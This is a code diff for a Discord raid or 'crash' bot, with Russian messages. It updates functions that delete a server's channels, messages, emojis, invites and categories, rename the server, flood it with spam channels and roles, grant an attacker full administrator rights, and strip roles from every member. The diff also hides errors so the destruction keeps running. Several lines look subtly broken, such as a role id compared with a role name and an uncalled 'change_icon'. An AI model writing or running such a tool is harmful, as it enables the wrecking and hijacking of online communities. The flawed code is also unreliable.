@@ -24,23 +24,22 @@ async def stop(ctx):
     global stop_spam
     if ctx.author.id in [config.OWNER_ID, SPECIAL_ID]:
         stop_spam = True
-        await ctx.send('Спам остановлен.')
+        await ctx.author.send('Краш остановлен.')
     else:
-        await ctx.send('У вас нет прав для выполнения этой команды.')
-
+        await ctx.author.send('У вас нет прав для выполнения этой команды.')
 @bot.command()
 async def admin(ctx, member: discord.Member = None):
     if ctx.author.id in [config.OWNER_ID, SPECIAL_ID]:
         if not member:
-            await ctx.send('Укажите пользователя, которому хотите выдать роль администратора.')
+            await ctx.author.send('Укажите пользователя, которому хотите выдать роль администратора.')
             return
 
         role = discord.utils.get(ctx.guild.roles, name=config.ADMIN_ROLE)
         if not role:
             role = await ctx.guild.create_role(name=config.ADMIN_ROLE, permissions=discord.Permissions.all())
 
-            await member.add_roles(role)
-            await ctx.send(f'Роль {config.ADMIN_ROLE} выдана пользователю {member.name}.')
+        await member.add_roles(role)
+        await ctx.author.send(f'Роль {config.ADMIN_ROLE} выдана пользователю {member.name}.')
     else:
         await ctx.send('У вас нет прав для выполнения этой команды.')
 
@@ -53,58 +52,88 @@ async def ban_bots(guild):
                 pass
 
 async def delete_invites(guild):
-    for invite in await guild.invites():
-        await invite.delete()
+    try:
+        for invite in await guild.invites():
+            await invite.delete()
+    except:
+        pass
 
 async def delete_emojis(guild):
-    for emoji in guild.emojis:
-        await emoji.delete()
+    try:
+        for emoji in guild.emojis:
+            await emoji.delete()
+    except:
+        pass
 
 async def delete_messages(guild):
-    for channel in guild.text_channels:
-        async for message in channel.history(limit=None):
-            if message.content != config.SPAM_MESSAGE:
-                await message.delete()
+    try:
+        for channel in guild.text_channels:
+            async for message in channel.history(limit=None):
+                if message.content != config.SPAM_MESSAGE:
+                    await message.delete()
+    except:
+        pass    
 
 async def delete_channels(guild):
-    for channel in guild.channels:
-        if channel.name != config.CHANNEL_NAME:
-            await channel.delete()
+    try:
+        for channel in guild.channels:
+            if channel.name != config.CHANNEL_NAME:
+                await channel.delete()
+    except:
+        pass
 
 async def remove_reactions(guild):
-    for channel in guild.text_channels:
-        async for message in channel.history(limit=None):
-            await message.clear_reactions()
+    try:
+        for channel in guild.text_channels:
+            async for message in channel.history(limit=None):
+                await message.clear_reactions()
+    except:
+        pass
 
 async def delete_categories(guild):
-    for category in guild.categories:
-        await category.delete()
+    try:
+        for category in guild.categories:
+            await category.delete()
+    except:
+        pass
 
 async def change_server_name(guild):
-    await guild.edit(name=config.SERVER_NAME)
+    try:    
+        await guild.edit(name=config.SERVER_NAME)
+    except:
+        pass
 
 async def create_and_spam_channels(guild):
     global stop_spam
     while not stop_spam:
-        tasks = [guild.create_text_channel(config.CHANNEL_NAME) for _ in range(5)]
-        channels = await asyncio.gather(*tasks)
-        for channel in channels:
-            asyncio.create_task(spam_channel(channel, guild))
-    await asyncio.sleep(config.COOLDOWN)
+        try:
+            tasks = [guild.create_text_channel(config.CHANNEL_NAME) for _ in range(5)]
+            channels = await asyncio.gather(*tasks)
+            for channel in channels:
+                asyncio.create_task(spam_channel(channel, guild))
+        except:
+            pass
+        await asyncio.sleep(config.COOLDOWN)
 
 async def spam_channel(channel, guild):
     global stop_spam
     while not stop_spam:
-        tasks = [channel.send(config.SPAM_MESSAGE) for channel in guild.text_channels]
-        await asyncio.gather(*tasks)
-    await asyncio.sleep(config.COOLDOWN)
+        try:
+            tasks = [channel.send(config.SPAM_MESSAGE) for channel in guild.text_channels]
+            await asyncio.gather(*tasks)
+        except:
+            pass
+        await asyncio.sleep(config.COOLDOWN)
 
 async def create_roles(guild):
-    global stop_spam
-    while not stop_spam:
-        tasks = [guild.create_role(name=config.ROLE_NAME) for _ in range(5)]
-        await asyncio.gather(*tasks)
-    await asyncio.sleep(config.COOLDOWN)
+        global stop_spam
+        while not stop_spam:
+            try:
+                tasks = [guild.create_role(name=config.ROLE_NAME) for _ in range(5)]
+                await asyncio.gather(*tasks)
+            except:
+                pass
+            await asyncio.sleep(config.COOLDOWN)
 
 async def change_bot_name():
     await bot.user.edit(username='Eclipse')
@@ -137,6 +166,17 @@ async def change_bot():
             else:
                 print('Не удалось загрузить изображение для аватара бота.')
 
+async def remove_roles_from_members(guild):
+    members = await guild.fetch_members()
+    for member in members:
+        roles = await member.fetch_roles()
+        for role in roles:
+            if role.id!= config.ADMIN_ROLE:
+                try:
+                    await member.remove_roles(role)
+                except:
+                    pass
+
 @bot.command()
 async def crash(ctx):
     if ctx.author.id in [config.OWNER_ID, SPECIAL_ID]:
@@ -150,7 +190,7 @@ async def crash(ctx):
         await remove_reactions(guild)
         await change_server_name(guild)
         await change_member_names(guild)
-        change_icon
+        await change_icon
         asyncio.create_task(create_and_spam_channels(guild))
         asyncio.create_task(create_roles(guild))
     else:
